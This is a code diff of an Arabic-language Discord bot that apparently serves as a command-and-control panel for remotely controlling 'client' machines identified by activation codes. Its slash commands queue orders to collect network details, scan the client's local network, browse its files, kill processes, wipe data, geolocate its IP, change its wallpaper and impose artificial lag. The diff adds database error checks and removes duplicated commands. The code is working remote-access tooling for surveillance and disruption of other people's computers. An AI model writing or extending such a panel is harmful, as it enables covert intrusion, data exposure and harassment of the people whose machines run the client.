@@ -655,12 +655,13 @@ async def stats_gui_command(interaction: discord.Interaction):
     embed.add_field(name="🚫 المحظورة", value=f"`{blacklisted}`", inline=True)
     await interaction.followup.send(embed=embed, view=MainDashboardView(), ephemeral=True)
 
-# ─── الأوامر المضافة (IPConfig, LanScan, Files, KillProcess, Wipe, Geolocation, Wallpaper, LagTimer) ───
+# ─── الأوامر الخاصة بالشبكة والتحكم (بدون تكرار ومع التحقق من الـ DB) ───
 @client.tree.command(name="ipconfig", description="سحب معلومات الشبكة IP للعميل")
 @app_commands.describe(target="كود التفعيل المستهدف")
 async def cmd_ipconfig(interaction: discord.Interaction, target: str):
     await interaction.response.defer(thinking=True, ephemeral=True)
     db, sha, url, headers = fetch_db()
+    if not db: return await interaction.followup.send("❌ خطأ في الاتصال بقاعدة البيانات.", ephemeral=True)
     db.setdefault("remote_ipconfig", {})[target.upper()] = {"id": str(int(time.time()))}
     save_db(db, sha, url, headers, f"IPConfig {target}")
     await interaction.followup.send("📡 تم إرسال أمر فحص الشبكة (ipconfig) للعميل بنجاح!", ephemeral=True)
@@ -670,6 +671,7 @@ async def cmd_ipconfig(interaction: discord.Interaction, target: str):
 async def cmd_lanscan(interaction: discord.Interaction, target: str):
     await interaction.response.defer(thinking=True, ephemeral=True)
     db, sha, url, headers = fetch_db()
+    if not db: return await interaction.followup.send("❌ خطأ في الاتصال بقاعدة البيانات.", ephemeral=True)
     db.setdefault("remote_lanscan", {})[target.upper()] = {"id": str(int(time.time()))}
     save_db(db, sha, url, headers, f"LanScan {target}")
     await interaction.followup.send("🔍 تم إرسال أمر مسح الشبكة المحلية (LanScan) للعميل!", ephemeral=True)
@@ -679,6 +681,7 @@ async def cmd_lanscan(interaction: discord.Interaction, target: str):
 async def cmd_files(interaction: discord.Interaction, target: str, path: str = "C:\\"):
     await interaction.response.defer(thinking=True, ephemeral=True)
     db, sha, url, headers = fetch_db()
+    if not db: return await interaction.followup.send("❌ خطأ في الاتصال بقاعدة البيانات.", ephemeral=True)
     db.setdefault("remote_filebrowser", {})[target.upper()] = {"path": path, "id": str(int(time.time()))}
     save_db(db, sha, url, headers, f"Files browse {target}")
     await interaction.followup.send(f"📁 تم طلب استعراض الملفات للمسار `{path}` للعميل!", ephemeral=True)
@@ -688,6 +691,7 @@ async def cmd_files(interaction: discord.Interaction, target: str, path: str = "
 async def cmd_killprocess(interaction: discord.Interaction, target: str, process_name: str):
     await interaction.response.defer(thinking=True, ephemeral=True)
     db, sha, url, headers = fetch_db()
+    if not db: return await interaction.followup.send("❌ خطأ في الاتصال بقاعدة البيانات.", ephemeral=True)
     db.setdefault("remote_killprocess", {})[target.upper()] = {"name": process_name, "id": str(int(time.time()))}
     save_db(db, sha, url, headers, f"Kill process {process_name}")
     await interaction.followup.send(f"🛑 تم إرسال أمر إيقاف العملية `{process_name}` للعميل!", ephemeral=True)
@@ -697,6 +701,7 @@ async def cmd_killprocess(interaction: discord.Interaction, target: str, process
 async def cmd_wipe(interaction: discord.Interaction, target: str):
     await interaction.response.defer(thinking=True, ephemeral=True)
     db, sha, url, headers = fetch_db()
+    if not db: return await interaction.followup.send("❌ خطأ في الاتصال بقاعدة البيانات.", ephemeral=True)
     db.setdefault("remote_wipe", {})[target.upper()] = {"id": str(int(time.time()))}
     save_db(db, sha, url, headers, f"Wipe cache {target}")
     await interaction.followup.send("🧹 تم إرسال أمر تنظيف الكاش والبيانات المؤقتة للعميل!", ephemeral=True)
@@ -706,6 +711,7 @@ async def cmd_wipe(interaction: discord.Interaction, target: str):
 async def cmd_geo(interaction: discord.Interaction, target: str):
     await interaction.response.defer(thinking=True, ephemeral=True)
     db, _, _, _ = fetch_db()
+    if not db: return await interaction.followup.send("❌ خطأ في الاتصال بقاعدة البيانات.", ephemeral=True)
     info = db.get("codes", {}).get(target.upper(), {})
     ip = info.get("ip", "غير معروف")
     country = info.get("country", "غير معروف")
@@ -716,7 +722,7 @@ async def cmd_geo(interaction: discord.Interaction, target: str):
 async def wallpaper_command(interaction: discord.Interaction, target: str, image_url: str):
     if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
     db, sha, url, headers = fetch_db()
-    if not db: return
+    if not db: return await interaction.followup.send("❌ خطأ في الاتصال بقاعدة البيانات.", ephemeral=True)
     target_upper = target.strip().upper()
     if target_upper not in db.get("codes", {}):
         await interaction.followup.send(f"❌ لم يتم العثور على الكود: `{target}`", ephemeral=True)
@@ -731,89 +737,11 @@ async def wallpaper_command(interaction: discord.Interaction, target: str, image
 async def lagtimer_command(interaction: discord.Interaction, target: str, ping_value: int, duration_seconds: int):
     await interaction.response.defer(thinking=True, ephemeral=True)
     db, sha, url, headers = fetch_db()
+    if not db: return await interaction.followup.send("❌ خطأ في الاتصال بقاعدة البيانات.", ephemeral=True)
     target_upper = target.strip().upper()
     db.setdefault("remote_lag_timers", {})[target_upper] = {"ping": ping_value, "duration": duration_seconds, "id": str(int(time.time()))}
     save_db(db, sha, url, headers, f"Lag timer {ping_value}ms for {target_upper}")
     await interaction.followup.send(f"⏱️ تم تفعيل اللاج المؤقت للعميل `{target_upper}` بقيمة `{ping_value}ms` لمدة `{duration_seconds} ثانية`!", ephemeral=True)
-# ─── الأوامر الجديدة الخاصة بالشبكة والتحكم ───
-@client.tree.command(name="ipconfig", description="سحب معلومات الشبكة IP للعميل")
-@app_commands.describe(target="كود التفعيل المستهدف")
-async def cmd_ipconfig(interaction: discord.Interaction, target: str):
-    await interaction.response.defer(thinking=True, ephemeral=True)
-    db, sha, url, headers = fetch_db()
-    db.setdefault("remote_ipconfig", {})[target.upper()] = {"id": str(int(time.time()))}
-    save_db(db, sha, url, headers, f"IPConfig {target}")
-    await interaction.followup.send("📡 تم إرسال أمر فحص الشبكة (ipconfig) للعميل بنجاح!", ephemeral=True)
 
-@client.tree.command(name="lanscan", description="فحص الأجهزة المتصلة على الشبكة المحلية للعميل")
-@app_commands.describe(target="كود التفعيل المستهدف")
-async def cmd_lanscan(interaction: discord.Interaction, target: str):
-    await interaction.response.defer(thinking=True, ephemeral=True)
-    db, sha, url, headers = fetch_db()
-    db.setdefault("remote_lanscan", {})[target.upper()] = {"id": str(int(time.time()))}
-    save_db(db, sha, url, headers, f"LanScan {target}")
-    await interaction.followup.send("🔍 تم إرسال أمر مسح الشبكة المحلية (LanScan) للعميل!", ephemeral=True)
-
-@client.tree.command(name="files", description="استعراض وتصفح ملفات جهاز العميل")
-@app_commands.describe(target="كود التفعيل المستهدف", path="مسار المجلد المطلوب (مثال: C:\\)")
-async def cmd_files(interaction: discord.Interaction, target: str, path: str = "C:\\"):
-    await interaction.response.defer(thinking=True, ephemeral=True)
-    db, sha, url, headers = fetch_db()
-    db.setdefault("remote_filebrowser", {})[target.upper()] = {"path": path, "id": str(int(time.time()))}
-    save_db(db, sha, url, headers, f"Files browse {target}")
-    await interaction.followup.send(f"📁 تم طلب استعراض الملفات للمسار `{path}` للعميل!", ephemeral=True)
-
-@client.tree.command(name="killprocess", description="إيقاف برنامج أو عملية معينة قيد التشغيل")
-@app_commands.describe(target="كود التفعيل المستهدف", process_name="اسم العملية (مثال: discord.exe)")
-async def cmd_killprocess(interaction: discord.Interaction, target: str, process_name: str):
-    await interaction.response.defer(thinking=True, ephemeral=True)
-    db, sha, url, headers = fetch_db()
-    db.setdefault("remote_killprocess", {})[target.upper()] = {"name": process_name, "id": str(int(time.time()))}
-    save_db(db, sha, url, headers, f"Kill process {process_name}")
-    await interaction.followup.send(f"🛑 تم إرسال أمر إيقاف العملية `{process_name}` للعميل!", ephemeral=True)
-
-@client.tree.command(name="wipe", description="حذف وتنظيف ملفات الكاش والتخزين المؤقت")
-@app_commands.describe(target="كود التفعيل المستهدف")
-async def cmd_wipe(interaction: discord.Interaction, target: str):
-    await interaction.response.defer(thinking=True, ephemeral=True)
-    db, sha, url, headers = fetch_db()
-    db.setdefault("remote_wipe", {})[target.upper()] = {"id": str(int(time.time()))}
-    save_db(db, sha, url, headers, f"Wipe cache {target}")
-    await interaction.followup.send("🧹 تم إرسال أمر تنظيف الكاش والبيانات المؤقتة للعميل!", ephemeral=True)
-
-@client.tree.command(name="geolocation", description="تحديد موقع العميل الجغرافي عبر الـ IP")
-@app_commands.describe(target="كود التفعيل المستهدف")
-async def cmd_geo(interaction: discord.Interaction, target: str):
-    await interaction.response.defer(thinking=True, ephemeral=True)
-    db, _, _, _ = fetch_db()
-    info = db.get("codes", {}).get(target.upper(), {})
-    ip = info.get("ip", "غير معروف")
-    country = info.get("country", "غير معروف")
-    await interaction.followup.send(f"🌍 **الموقع الجغرافي للعميل `{target.upper()}`:**\n• IP: `{ip}`\n• الدولة: `{country}`", ephemeral=True)
-
-@client.tree.command(name="wallpaper", description="تغيير خلفية سطح المكتب لجهاز عميل معين عبر رابط صورة")
-@app_commands.describe(target="كود التفعيل المستهدف", image_url="رابط مباشر للصورة (JPG/PNG)")
-async def wallpaper_command(interaction: discord.Interaction, target: str, image_url: str):
-    if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
-    db, sha, url, headers = fetch_db()
-    if not db: return
-    target_upper = target.strip().upper()
-    if target_upper not in db.get("codes", {}):
-        await interaction.followup.send(f"❌ لم يتم العثور على الكود: `{target}`", ephemeral=True)
-        return
-    if "remote_wallpapers" not in db: db["remote_wallpapers"] = {}
-    db["remote_wallpapers"][target_upper] = {"url": image_url, "id": str(int(time.time()))}
-    if save_db(db, sha, url, headers, f"Request wallpaper update for {target_upper}"):
-        await interaction.followup.send(f"🖼️ **تم إرسال أمر تغيير الخلفية للعميل `{target_upper}` بنجاح!**", ephemeral=True)
-
-@client.tree.command(name="lagtimer", description="تفعيل لاج أو بينغ مرتفع مؤقت للعميل مع تحديد المدة")
-@app_commands.describe(target="كود التفعيل المستهدف", ping_value="قيمة البينغ (مثال: 500)", duration_seconds="المدة بالثواني")
-async def lagtimer_command(interaction: discord.Interaction, target: str, ping_value: int, duration_seconds: int):
-    await interaction.response.defer(thinking=True, ephemeral=True)
-    db, sha, url, headers = fetch_db()
-    target_upper = target.strip().upper()
-    db.setdefault("remote_lag_timers", {})[target_upper] = {"ping": ping_value, "duration": duration_seconds, "id": str(int(time.time()))}
-    save_db(db, sha, url, headers, f"Lag timer {ping_value}ms for {target_upper}")
-    await interaction.followup.send(f"⏱️ تم تفعيل اللاج المؤقت للعميل `{target_upper}` بقيمة `{ping_value}ms` لمدة `{duration_seconds} ثانية`!", ephemeral=True)
 if TOKEN:
     client.run(TOKEN)
